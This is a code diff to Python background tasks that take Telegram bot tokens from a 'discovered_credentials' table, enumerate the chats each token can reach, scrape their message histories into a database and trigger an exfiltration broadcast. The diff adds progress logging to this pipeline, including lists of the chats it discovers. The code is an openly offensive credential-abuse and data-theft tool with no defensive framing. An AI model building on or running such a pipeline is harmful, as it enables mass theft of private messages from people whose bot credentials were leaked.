@@ -24,6 +24,7 @@ def exfiltrate_chat(cred_id: str):
 
 async def _exfiltrate_logic(cred_id: str):
     print(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
+    await broadcaster_service.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
     if not response.data:
@@ -44,8 +45,10 @@ async def _exfiltrate_logic(cred_id: str):
     # Scrape
     try:
         print(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
+        await broadcaster_service.send_log(f"⏳ Scraping chat `{chat_id}`...")
         messages = await scraper_service.scrape_history(bot_token, chat_id)
         print(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
+        await broadcaster_service.send_log(f"✅ Scraped {len(messages)} messages.")
     except Exception as e:
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Scraping failed: {e}"
@@ -63,6 +66,9 @@ async def _exfiltrate_logic(cred_id: str):
             new_count += 1
         except Exception:
             pass # Skip duplicate
+
+    if new_count > 0:
+        await broadcaster_service.send_log(f"💾 Saved {new_count} new messages to DB.")
 
     # Trigger Broadcast
     if new_count > 0:
@@ -86,6 +92,7 @@ def enrich_credential(cred_id: str):
 
 async def _enrich_logic(cred_id: str):
     print(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
+    await broadcaster_service.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
     if not response.data:
@@ -105,6 +112,11 @@ async def _enrich_logic(cred_id: str):
         print(f"🔎 [Enrich] Discovering chats via ScraperService...")
         chats = await scraper_service.discover_chats(bot_token)
         print(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
+        if chats:
+            chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
+            await broadcaster_service.send_log(f"✅ Discovered chats: {chat_list}")
+        else:
+            await broadcaster_service.send_log("⚠️ No chats found.")
     except Exception as e:
         return f"Discovery failed: {e}"
 
@@ -128,7 +140,9 @@ async def _enrich_logic(cred_id: str):
     }).eq("id", cred_id).execute()
     
     # Trigger Exfiltration for Primary
+    # Trigger Exfiltration for Primary
     print(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
+    await broadcaster_service.send_log(f"🚀 Triggering background exfiltration task.")
     exfiltrate_chat.delay(cred_id)
     
     msg = f"Enriched {cred_id} with chat {first_chat['id']}."
